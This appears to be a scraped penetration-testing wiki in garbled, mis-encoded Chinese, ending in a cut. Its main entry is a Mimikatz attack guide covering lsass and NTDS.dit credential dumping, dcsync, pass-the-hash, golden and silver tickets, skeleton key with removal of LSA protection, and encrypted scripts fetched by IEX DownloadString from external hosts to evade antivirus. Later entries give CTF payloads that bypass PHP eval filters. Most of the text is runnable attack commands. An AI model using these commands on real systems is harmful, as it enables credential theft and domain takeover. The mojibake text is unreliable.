ä¸ªç¥å™¨çš„è¿è¡Œå§¿åŠ¿ï¼šä¹ç§å§¿åŠ¿è¿è¡Œï¼šMimikatzï¼šhttps://www.freebuf.com/articles/web/176796.html å€Ÿç”¨PowerShell Copy#è¯»å–å¯†ç æ˜æ–‡(éœ€è¦ç®¡ç†å‘˜æƒé™)powershell IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1); Invoke-Mimikatz â€“DumpCerts Copy#è¯»å–å¯†ç hashå€¼(éœ€è¦ç®¡ç†å‘˜æƒé™)powershell IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1);Get-PassHashes 0x01 è·å–æœ¬åœ°å¸æˆ·å¯†ç 1.1 æœ¬åœ°æ‰§è¡Œä¸‹è½½mimikatzç¨‹åºï¼Œæ‰¾åˆ°è‡ªå·±ç³»ç»Ÿå¯¹åº”çš„ä½æ•°ï¼Œå³é”®ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼š Copy#æå‡æƒé™privilege::debug#æŠ“å–å¯†ç sekurlsa::logonpasswords å½“ç›®æ ‡ä¸ºwin10æˆ–2012R2ä»¥ä¸Šæ—¶ï¼Œé»˜è®¤åœ¨å†…å­˜ç¼“å­˜ä¸­ç¦æ­¢ä¿å­˜æ˜æ–‡å¯†ç ï¼Œä½†å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼æŠ“å–æ˜æ–‡ã€‚ cmdä¿®æ”¹æ³¨å†Œè¡¨å‘½ä»¤ï¼š Copyreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f#é‡å¯æˆ–ç”¨æˆ·é‡æ–°ç™»å½•åå¯ä»¥æˆåŠŸæŠ“å– 1.2 SAMè¡¨è·å–hashCopy#å¯¼å‡ºSAMæ•°æ®reg save HKLM\\SYSTEM SYSTEMreg save HKLM\\SAM SAM#ä½¿ç”¨mimikatzæå–hashlsadump::sam /sam:SAM /system:SYSTEM 0x02 Procdump+Mimikatzå½“mimikatzæ— æ³•åœ¨ä¸»æœºä¸Šè¿è¡Œæ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¾®è½¯å®˜æ–¹å‘å¸ƒçš„å·¥å…·Procdumpå¯¼å‡ºlsass.exe: Copyprocdump64.exe -accepteula -ma lsass.exe lsass.dmp å°†lsass.dmpä¸‹è½½åˆ°æœ¬åœ°åï¼Œç„¶åæ‰§è¡Œmimikatz: Copymimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full exit ä¸ºäº†æ–¹ä¾¿å¤åˆ¶ä¸æŸ¥çœ‹ï¼Œå¯ä»¥è¾“å‡ºåˆ°æœ¬åœ°æ–‡ä»¶é‡Œé¢ï¼š Copymimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords full pssword.txt 0x03 è¯»å–åŸŸæ§ä¸­åŸŸæˆå‘˜Hash3.1 åŸŸæ§æœ¬åœ°è¯»å–æ³¨ï¼šå¾—åœ¨åŸŸæ§ä¸Šä»¥åŸŸç®¡ç†å‘˜èº«ä»½æ‰§è¡Œmimikatz æ–¹æ³•ä¸€ï¼šç›´æ¥æ‰§è¡Œ Copy#æå‡æƒé™privilege::debugæŠ“å–å¯†ç lsadump::lsa /patch æ–¹æ³•äºŒï¼šé€šè¿‡ dcsyncï¼Œåˆ©ç”¨ç›®å½•å¤åˆ¶æœåŠ¡ï¼ˆDRSï¼‰ä»NTDS.DITæ–‡ä»¶ä¸­æ£€ç´¢å¯†ç å“ˆå¸Œå€¼ï¼Œå¯ä»¥åœ¨åŸŸç®¡æƒé™ä¸‹æ‰§è¡Œè·å–ï¼š Copy#è·å–æ‰€æœ‰åŸŸç”¨æˆ·lsadump::dcsync /domain:test.com /all /csv#æŒ‡å®šè·å–æŸä¸ªç”¨æˆ·çš„hashlsadump::dcsync /domain:test.com /user:test 3.2 å¯¼å‡ºåŸŸæˆå‘˜HashCopy åŸŸè´¦æˆ·çš„ç”¨æˆ·åå’Œhashå¯†ç ä»¥åŸŸæ•°æ®åº“çš„å½¢å¼å­˜æ”¾åœ¨åŸŸæ§åˆ¶å™¨çš„ font style=color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);%SystemRoot% tds\\NTDS.DIT/font æ–‡ä»¶ä¸­ã€‚ è¿™é‡Œå¯ä»¥å€ŸåŠ©ï¼šntdsutil.exeï¼ŒåŸŸæ§åˆ¶å™¨è‡ªå¸¦çš„åŸŸæ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŸŸæ•°æ®åº“ï¼Œæå–å‡ºåŸŸä¸­æ‰€æœ‰çš„åŸŸç”¨æˆ·ä¿¡æ¯ï¼Œåœ¨åŸŸæ§ä¸Šä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¯¼å‡ºåŸŸæ•°æ®åº“ï¼š Copy#åˆ›å»ºå¿«ç…§ntdsutil snapshot activate instance ntds create quit quit#åŠ è½½å¿«ç…§ntdsutil snapshot mount 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quit#Copyæ–‡ä»¶å‰¯æœ¬copy C:\\$SNAP_201911211122_VOLUMEC$\\windows\\NTDS tds.dit c: tds.dit å°†ntds.ditæ–‡ä»¶æ‹·è´åˆ°æœ¬åœ°åˆ©ç”¨impacketè„šæœ¬dumpå‡ºHashï¼š Copysecretsdump.py -ntds.dit -system system.hive LOCAL é™¤äº†å€ŸåŠ©pythonï¼Œè¿˜æœ‰ä¸€ä¸ªNTDSDumpExï¼ˆä¼šè¢«360æŸ¥æ€çš„å“¦ï¼‰ï¼š å·¥å…·åœ°å€ï¼šhttps://github.com/zcgonvh/NTDSDumpEx/releases CopyNTDSDumpEx -d ntds.dit -o domain.txt -s system.hiv (system.hiveæ–‡ä»¶è·å–:reg save hklm\\system system.hive)NTDSDumpEx -d ntds.dit -o domain.txt -r (æ­¤å‘½ä»¤é€‚ç”¨äºåœ¨åŸŸæ§æœ¬åœ°æ‰§è¡Œ) æœ€åè®°å¾—å¸è½½åˆ é™¤å¿«ç…§ï¼š Copyntdsutil snapshot unmount 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quitntdsutil snapshot delete 72ba82f0-5805-4365-a73c-0ccd01f5ed0d quit quit 3.3 secretsdumpè„šæœ¬ç›´æ¥å¯¼å‡ºåŸŸhashä¸ºä»€ä¹ˆè¦å†æä¸€ésecretsdumpå‘¢ï¼Œå› ä¸ºå®ƒå¯ä»¥ç›´æ¥å¯¼å‡ºï¼Œè¯´ç™½äº†ï¼Œç®€å•ç²—æš´ï¼š Copypython secretsdump.py rabbitmask:123456@192.168.15.181 é¦–å…ˆå®ƒä¼šå¯¼å‡ºæœ¬åœ°SAMä¸­çš„hashï¼Œç„¶åæ˜¯æ‰€æœ‰åŸŸå†…ç”¨æˆ·çš„IPï¼Œå…¨éƒ¨è·å–æˆåŠŸ 0x04 å“ˆå¸Œä¼ é€’æ”»å‡»PTH4.1 å·¥ä½œç»„ç¯å¢ƒå½“æˆ‘ä»¬è·å¾—äº†ä¸€å°ä¸»æœºçš„NTLMå“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨mimikatzå¯¹å…¶è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ã€‚æ‰§è¡Œå®Œå‘½ä»¤åï¼Œä¼šå¼¹å‡ºcmdçª—å£ã€‚ Copy#ä½¿ç”¨administratorç”¨æˆ·çš„NTLMå“ˆå¸Œå€¼è¿›è¡Œæ”»å‡»sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9 Copy#ä½¿ç”¨xieç”¨æˆ·çš„NTLMå“ˆå¸Œå€¼è¿›è¡Œæ”»å‡»sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9 åœ¨å¼¹å‡ºçš„cmdçª—å£ï¼Œæˆ‘ä»¬ç›´æ¥å¯ä»¥è¿æ¥è¯¥ä¸»æœºï¼Œå¹¶ä¸”æŸ¥çœ‹è¯¥ä¸»æœºä¸‹çš„æ–‡ä»¶å¤¹ã€‚ æˆ–è€…å¯ä»¥ç›´æ¥å°†è¯¥ä¸»æœºçš„Cç›˜æ˜ å°„åˆ°æœ¬åœ°çš„Kç›˜ã€‚ æ³¨ï¼šåªèƒ½åœ¨ mimikatz å¼¹å‡ºçš„ cmd çª—å£æ‰å¯ä»¥æ‰§è¡Œè¿™äº›æ“ä½œï¼Œæ³¨å…¥æˆåŠŸåï¼Œå¯ä»¥ä½¿ç”¨psexecã€wmicã€wmiexecç­‰å®ç°è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚ 4.2 åŸŸç¯å¢ƒåœ¨åŸŸç¯å¢ƒä¸­ï¼Œå½“æˆ‘ä»¬è·å¾—äº†åŸŸå†…ç”¨æˆ·çš„NTLMå“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŸŸå†…çš„ä¸€å°ä¸»æœºç”¨mimikatzå¯¹åŸŸæ§è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ã€‚æ‰§è¡Œå®Œå‘½ä»¤åï¼Œä¼šå¼¹å‡ºcmdçª—å£ã€‚å‰ææ˜¯æˆ‘ä»¬å¿…é¡»æ‹¥æœ‰åŸŸå†…ä»»æ„ä¸€å°ä¸»æœºçš„æœ¬åœ° administrator æƒé™å’Œè·å¾—äº†åŸŸç”¨æˆ·çš„NTLMå“ˆå¸Œå€¼ åŸŸï¼šxie.comåŸŸæ§ï¼šWIN2008.xie.com Copy#ä½¿ç”¨åŸŸç®¡ç†å‘˜administratorçš„NTLMå“ˆå¸Œå€¼å¯¹åŸŸæ§è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»sekurlsa::pth /user:administrator /domain:xie.com /ntlm:dbd621b8ed24eb627d32514476fac6c5 Copy#ä½¿ç”¨åŸŸç”¨æˆ·xieçš„NTLMå“ˆå¸Œå€¼å¯¹åŸŸæ§è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»sekurlsa::pth /user:xie /domain:xie.com /ntlm:329153f560eb329c0e1deea55e88a1e9 4.3 MSFè¿›è¡Œå“ˆå¸Œä¼ é€’Copy æœ‰äº›æ—¶å€™ï¼Œå½“æˆ‘ä»¬è·å–åˆ°äº†æŸå°ä¸»æœºçš„Administratorç”¨æˆ·çš„LM-Hashå’Œ NTLM-Hash ï¼Œå¹¶ä¸”è¯¥ä¸»æœºçš„445ç«¯å£æ‰“å¼€ç€ã€‚æˆ‘ä»¬åˆ™å¯ä»¥åˆ©ç”¨ font style=color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);exploit/windows/smb/psexec/font æ¼æ´ç”¨MSFè¿›è¡Œè¿œç¨‹ç™»å½•(å“ˆå¸Œä¼ é€’æ”»å‡»)ã€‚(åªèƒ½æ˜¯administratorç”¨æˆ·çš„LM-hashå’ŒNTLM-hash)ï¼Œè¿™ä¸ªåˆ©ç”¨è·Ÿå·¥ä½œç»„ç¯å¢ƒæˆ–è€…åŸŸç¯å¢ƒæ— å…³ã€‚ Copymsf use exploit/windows/smb/psexecmsf exploit(psexec) set payload windows/meterpreter/reverse_tcpmsf exploit(psexec) set lhost 192.168.10.27msf exploit(psexec) set rhost 192.168.10.14msf exploit(psexec) set smbuser Administratormsf exploit(psexec) set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6 #è¿™é‡ŒLMå’ŒNTLMæˆ‘ä»¬å·²ç»è·å–åˆ°äº†msf exploit(psexec) exploit 0x05 ç¥¨æ®ä¼ é€’æ”»å‡»(PTT)5.1 é»„é‡‘ç¥¨æ®åŸŸä¸­æ¯ä¸ªç”¨æˆ·çš„ Ticket éƒ½æ˜¯ç”± krbtgt çš„å¯†ç  Hash æ¥è®¡ç®—ç”Ÿæˆçš„ï¼Œå› æ­¤åªè¦è·å–åˆ°äº† krbtgt ç”¨æˆ·çš„å¯†ç  Hash ï¼Œå°±å¯ä»¥éšæ„ä¼ªé€  Ticket ï¼Œè¿›è€Œä½¿ç”¨ Ticket ç™»é™†åŸŸæ§åˆ¶å™¨ï¼Œä½¿ç”¨ krbtgt ç”¨æˆ· hash ç”Ÿæˆçš„ç¥¨æ®è¢«ç§°ä¸º Golden Ticketï¼Œæ­¤ç±»æ”»å‡»æ–¹æ³•è¢«ç§°ä¸ºç¥¨æ®ä¼ é€’æ”»å‡»ã€‚ é¦–å…ˆè·å–krbtgtçš„ç”¨æˆ·hash: Copymimikatz lsadump::dcsync /domain:xx.com /user:krbtgt åˆ©ç”¨ mimikatz ç”ŸæˆåŸŸç®¡æƒé™çš„ Golden Ticketï¼Œå¡«å…¥å¯¹åº”çš„åŸŸç®¡ç†å‘˜è´¦å·ã€åŸŸåç§°ã€sidå€¼ï¼Œå¦‚ä¸‹ï¼š Copykerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi Copy#å¯¼å…¥åˆšæ‰ç”Ÿæˆçš„ç¥¨æ®kerberos::ptt test.kiribi#å¯¼å…¥æˆåŠŸåå¯è·å–åŸŸç®¡æƒé™dir \\\\dc.abc.com\\c$ 5.2 ç™½é“¶ç¥¨æ®é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¸€äº›åŒºåˆ«ï¼šGolden Ticketï¼šä¼ªé€ TGTï¼Œå¯ä»¥è·å–ä»»ä½• Kerberos æœåŠ¡æƒé™ï¼Œä¸”ç”± krbtgt çš„ hash åŠ å¯†ï¼Œé‡‘ç¥¨åœ¨ä½¿ç”¨çš„è¿‡ç¨‹éœ€è¦å’ŒåŸŸæ§é€šä¿¡ ç™½é“¶ç¥¨æ®ï¼šä¼ªé€  TGS ï¼Œåªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡ï¼Œä¸”ç”±æœåŠ¡è´¦å·ï¼ˆé€šå¸¸ä¸ºè®¡ç®—æœºè´¦æˆ·ï¼‰çš„ Hash åŠ å¯† ï¼Œé“¶ç¥¨åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸éœ€è¦åŒåŸŸæ§é€šä¿¡ Copy#åœ¨åŸŸæ§ä¸Šå¯¼å‡º DC$ çš„ HASHmimikatz log privilege::debug sekurlsa::logonpasswords#åˆ©ç”¨ DC$ çš„ Hashåˆ¶ä½œä¸€å¼  cifs æœåŠ¡çš„ç™½é“¶ç¥¨æ®kerberos::golden /domain:ABC.COM /sid: S-1-5-21-3912242732-2617380311-62526969 /target:DC.ABC.COM /rc4:f3a76b2f3e5af8d2808734b8974acba9 /service:cifs /user:strage /ptt#cifsæ˜¯æŒ‡çš„æ–‡ä»¶å…±äº«æœåŠ¡ï¼Œæœ‰äº† cifs æœåŠ¡æƒé™ï¼Œå°±å¯ä»¥è®¿é—®åŸŸæ§åˆ¶å™¨çš„æ–‡ä»¶ç³»ç»Ÿdir \\\\DC.ABC.COM\\C$ 5.3 skeleton keyskeleton key(ä¸‡èƒ½é’¥åŒ™)å°±æ˜¯ç»™æ‰€æœ‰åŸŸå†…ç”¨æˆ·æ·»åŠ ä¸€ä¸ªç›¸åŒçš„å¯†ç ï¼ŒåŸŸå†…æ‰€æœ‰çš„ç”¨æˆ· éƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªå¯†ç è¿›è¡Œè®¤è¯ï¼ŒåŒæ—¶åŸå§‹å¯†ç ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œå…¶åŸç†æ˜¯å¯¹ lsass.exe è¿›è¡Œæ³¨ å…¥ï¼Œæ‰€ä»¥é‡å¯åä¼šå¤±æ•ˆã€‚ Copy#åœ¨åŸŸæ§ä¸Šå®‰è£… skeleton keymimikatz.exe privilege::debug misc::skeleton#åœ¨åŸŸå†…å…¶ä»–æœºå™¨å°è¯•ä½¿ç”¨ skeleton key å»è®¿é—®åŸŸæ§ï¼Œæ·»åŠ çš„å¯†ç æ˜¯ mimikatznet use \\\\WIN-9P499QKTLDO.adtest.com\\c$ mimikatz /user:adtest\\administrator å¾®è½¯åœ¨ 2014 å¹´ 3 æœˆ 12 æ—¥æ·»åŠ äº† LSA çˆ†æŠ¤ç­–ç•¥ï¼Œç”¨æ¥é˜²æ­¢å¯¹è¿›ç¨‹ lsass.exe çš„ä»£ç æ³¨å…¥ã€‚å¦‚æœç›´æ¥å°è¯•æ·»åŠ  skelenton key ä¼šå¤±è´¥ã€‚ Copy#é€‚ç”¨ç³»ç»Ÿwindows 8.1windows server 2012 åŠä»¥ä¸Š å½“ç„¶ mimikatz ä¾æ—§å¯ä»¥ç»•è¿‡ï¼Œè¯¥åŠŸèƒ½éœ€è¦å¯¼å…¥mimidrv.sysæ–‡ä»¶ï¼Œå¯¼å…¥å‘½ä»¤å¦‚ä¸‹: Copyprivilege::debug!+!processprotect /process:lsass.exe /remove misc::skeleton 5.4 MS14-068å½“æˆ‘ä»¬æ‹¿åˆ°äº†ä¸€ä¸ªæ™®é€šåŸŸæˆå‘˜çš„è´¦å·åï¼Œæƒ³ç»§ç»­å¯¹è¯¥åŸŸè¿›è¡Œæ¸—é€ï¼Œæ‹¿åˆ°åŸŸæ§æœåŠ¡å™¨æƒé™ã€‚å¦‚æœåŸŸæ§æœåŠ¡å™¨å­˜åœ¨ MS14_068 æ¼æ´ï¼Œå¹¶ä¸”æœªæ‰“è¡¥ä¸ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ MS14_068 å¿«é€Ÿè·å¾—åŸŸæ§æœåŠ¡å™¨æƒé™ã€‚ MS14-068ç¼–å· CVE-2014-6324ï¼Œè¡¥ä¸ä¸º 3011780 ï¼Œå¦‚æœè‡ªæ£€å¯åœ¨åŸŸæ§åˆ¶å™¨ä¸Šä½¿ç”¨å‘½ä»¤æ£€æµ‹ã€‚ Copysysteminfo |find 3011780#ä¸ºç©ºè¯´æ˜è¯¥æœåŠ¡å™¨å­˜åœ¨MS14-068æ¼æ´ æ“ä½œé“¾æ¥ï¼šMS14-068å¤ç°(CVE-2014-6324)ï¼šhttps://www.cnblogs.com/-mo-/p/11890539.html 0x06 å…¶ä»–6.1 ä½¿ç”¨mimikatzå¯¼å‡ºchromeä¸­çš„å¯†ç è¯¦æƒ…è¯·è§ï¼šé“¾æ¥ 6.2 éšè—åŠŸèƒ½ç®¡ç†å‘˜å¸¸å¸¸ä¼šç¦ç”¨ä¸€äº›é‡è¦ç¨‹åºçš„è¿è¡Œï¼Œæ¯”å¦‚cmdã€regeditã€taskmgrï¼Œæ­¤æ—¶ä¸æ–¹ä¾¿æ¸—é€çš„è¿›ä¸€æ­¥è¿›è¡Œï¼Œè¿™é‡Œé™¤äº†å»æ”¹å›åŸæ¥çš„é…ç½®ï¼Œè¿˜å¯ä»¥å€ŸåŠ©mimikatzçš„ä¸€äº›åŠŸèƒ½ï¼š Copyprivilege::debugmisc::cmdmisc::regeditmisc::taskmgr 6.3 å…æ€å¤„ç†Powersploitä¸­æä¾›çš„å¾ˆå¤šå·¥å…·éƒ½æ˜¯åšè¿‡åŠ å¯†å¤„ç†çš„ï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†ä¸€äº›ç”¨æ¥åŠ å¯†å¤„ç†çš„è„šæœ¬ï¼ŒOut-EncryptedScriptå°±æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚ é¦–å…ˆåœ¨æœ¬åœ°å¯¹Invoke-Mimikatz.ps1è¿›è¡ŒåŠ å¯†å¤„ç†ï¼š Copypoweshell.exe Import-Module .\\Out-EncryptedScript.ps1poweshell.exe Out-EncryptedScript -ScriptPath .\\Invoke-Mimikatz.ps1 -Password å¯†ç  -Salt éšæœºæ•°#é»˜è®¤ç”Ÿæˆçš„æ–‡ä»¶æ˜¯evil.ps1-Password è®¾ç½®åŠ å¯†çš„å¯†é’¥-Salt éšæœºæ•°ï¼Œé˜²æ­¢è¢«æš´åŠ›ç ´è§£ å°†åŠ å¯†ç”Ÿæˆçš„evil.sp1è„šæœ¬æ”¾åœ¨ç›®æ ‡æœºä¸Šï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š Copy#è¿œç¨‹åŠ è½½è§£å¯†è„šæœ¬poweshell.exe IEX(New-Object Net.WebClient).DownloadString(http://1.1.1.32/PowerSploit/ScriptModification/Out-EncryptedScript.ps1)[String] $cmd = Get-Content .\\evil.ps1Invoke-Expression $cmd$decrypted = de password saltInvoke-Expression $decryptedInvoke-Mimikatz"},{"title":"æ— å­—æ¯","path":"/wiki/WP/REC/æ— å­—æ¯.html","content":"çŸ¥è¯†ç‚¹binä¸ºbinaryçš„ç®€å†™ï¼Œä¸»è¦æ”¾ç½®â¼€äº›ç³»ç»Ÿçš„å¿…å¤‡æ‰§â¾æ¡£ä¾‹å¦‚:catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64ç­‰ã€‚æˆ‘ä»¬â½‡å¸¸ç›´æ¥ä½¿â½¤çš„catæˆ–è€…lsç­‰ç­‰éƒ½å…¶å®æ˜¯ç®€å†™ï¼Œä¾‹å¦‚lså®Œæ•´å…¨ç§°åº”è¯¥æ˜¯/bin/ls"},{"title":"æ— å‚æ•°REC","path":"/wiki/WP/REC/æ— å‚æ•°REC.html","content":"ä»£ç if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\|\\[|\\]|\\|\\:|\\|\\|\\,|\\|\\.|\\|\\/|\\?|\\\\\\\\/i, $c)) eval($c); else highlight_file(__FILE__); å¸¸è§ç»•è¿‡å§¿åŠ¿getallheaders()ï¼šè¿”å›æ‰€æœ‰çš„HTTPå¤´ä¿¡æ¯ï¼Œè¿”å›çš„æ˜¯æ•°ç»„â½½evalè¦æ±‚ä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¦â½¤implode()å‡½æ•°å°†æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²get_defined_vars()ï¼šè¯¥å‡½æ•°çš„ä½œâ½¤æ˜¯è·å–æ‰€æœ‰çš„å·²å®šä¹‰å˜é‡ï¼Œè¿”å›å€¼ä¹Ÿæ˜¯æ•°ç»„ï¼Œä¸è¿‡æ˜¯â¼†ç»´æ•°ç»„ï¼Œâ½¤var_dump()è¾“å‡ºå¯ä»¥çœ‹â»…è¾“å‡ºçš„å†…å®¹ï¼Œçœ‹â»…åœ¨ç¬¬â¼ä½ä¹‹åï¼Œå¯ä»¥â½¤current()å‡½æ•°æ¥è·å–å…¶å€¼ï¼Œè¯¦ç»†å¯ä»¥çœ‹å®˜â½…å‡½æ•°ã€‚payloadï¼švar_dump(current(get_defined_vars()));session_id()ï¼šsession_id()å¯ä»¥â½¤æ¥è·å–/è®¾ç½®å½“å‰ä¼šè¯ IDï¼Œå¯ä»¥â½¤è¿™ä¸ªå‡½æ•°æ¥è·å–cookieä¸­çš„phpsessionidï¼Œå¹¶ä¸”è¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„ã€‚ å¦‚å¯ä»¥åœ¨cookieä¸­è®¾ç½® PHPSESSID=706870696e666f28293bï¼Œç„¶åâ½¤hex2bin()å‡½æ•°ï¼Œå³ä¼ â¼Š?exp=eval(hex2bin(session_id(session_start()))); å¹¶è®¾ç½®cookieï¼šPHPSESSID=706870696e666f28293b session_start å‡½æ•°æ˜¯ä¸ºäº†å¼€å¯sessioné…åˆä½¿â½¤çš„å‡½æ•°ï¼šprint_r(scandir(â€˜.â€™)); æŸ¥çœ‹å½“å‰â½¬å½•ä¸‹çš„æ‰€æœ‰â½‚ä»¶å var_dump()localeconv() å‡½æ•°è¿”å›â¼€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬â¼€ä¸ªå€¼ï¼Œposæ˜¯currentçš„åˆ«åeach() è¿”å›æ•°ç»„ä¸­å½“å‰çš„é”®/å€¼å¯¹å¹¶å°†æ•°ç»„æŒ‡é’ˆå‘å‰ç§»åŠ¨â¼€æ­¥end() å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åâ¼€ä¸ªå•å…ƒnext() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨â¼€ä½prev() å°†æ•°ç»„ä¸­çš„å†…éƒ¨æŒ‡é’ˆå€’å›â¼€ä½array_reverse() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ payload1?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv()))))); è§£é‡Š?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));ï¼šè¿™æ˜¯ä¸€ä¸ªGETè¯·æ±‚çš„å‚æ•°cï¼Œå…¶å€¼æ˜¯ä¸€ä¸ªPHPè¡¨è¾¾å¼ã€‚echoï¼šPHPä¸­çš„è¾“å‡ºå‡½æ•°ï¼Œç”¨äºè¾“å‡ºå­—ç¬¦ä¸²æˆ–è¡¨è¾¾å¼çš„ç»“æœã€‚highlight_fileï¼šPHPä¸­çš„å‡½æ•°ï¼Œç”¨äºé«˜äº®æ˜¾ç¤ºPHPæ–‡ä»¶çš„å†…å®¹ã€‚nextï¼šPHPä¸­çš„å‡½æ•°ï¼Œç”¨äºå°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚array_reverseï¼šPHPä¸­çš„å‡½æ•°ï¼Œç”¨äºåè½¬æ•°ç»„å…ƒç´ çš„é¡ºåºã€‚scandirï¼šPHPä¸­çš„å‡½æ•°ï¼Œç”¨äºåˆ—å‡ºç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•ã€‚posï¼šPHPä¸­çš„å‡½æ•°ï¼Œè¿”å›æ•°ç»„ä¸­å½“å‰å†…éƒ¨æŒ‡é’ˆæŒ‡å‘çš„å€¼ã€‚localeconv()ï¼šPHPä¸­çš„å‡½æ•°ï¼Œè¿”å›æœ¬åœ°åŒ–çš„æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯ã€‚ å…·ä½“æ¥è¯´ï¼Œè¿™æ®µä»£ç çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼šlocaleconv()ï¼šè·å–æœ¬åœ°åŒ–çš„æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯ã€‚pos(localeconv())ï¼šè·å–localeconv()è¿”å›æ•°ç»„ä¸­å½“å‰å†…éƒ¨æŒ‡é’ˆæŒ‡å‘çš„å€¼ã€‚scandir(pos(localeconv()))ï¼šåˆ—å‡ºpos(localeconv())æŒ‡å‘çš„ç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•ã€‚array_reverse(scandir(pos(localeconv())))ï¼šåè½¬è¿™äº›æ–‡ä»¶å’Œå­ç›®å½•çš„é¡ºåºã€‚next(array_reverse(scandir(pos(localeconv()))))ï¼šå°†å†…éƒ¨æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå³ä¸‹ä¸€ä¸ªæ–‡ä»¶æˆ–å­ç›®å½•ã€‚highlight_file(next(array_reverse(scandir(pos(localeconv())))))ï¼šé«˜äº®æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚echoï¼šè¾“å‡ºè¿™ä¸ªé«˜äº®æ˜¾ç¤ºçš„å†…å®¹ã€‚ payload2?c=eval(next(reset(get_defined_vars())));1=;system(tac%20flag.php); è§£é‡Š?c=eval(next(reset(get_defined_vars())));ï¼šè¿™æ˜¯GETè¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œå…¶ä¸­cå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªPHPè¡¨è¾¾å¼ã€‚get_defined_vars()ï¼šè¿™ä¸ªå‡½æ•°è¿”å›å½“å‰æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„æ•°ç»„ï¼ŒåŒ…æ‹¬å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡ã€‚reset()ï¼šè¿™ä¸ªå‡½æ•°å°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚next()ï¼šè¿™ä¸ªå‡½æ•°å°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½ï¼Œå¹¶è¿”å›å½“å‰æŒ‡é’ˆå¤„çš„å…ƒç´ å€¼ã€‚eval()ï¼šè¿™ä¸ªå‡½æ•°æ‰§è¡Œå­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç ã€‚è¿™æ®µä»£ç 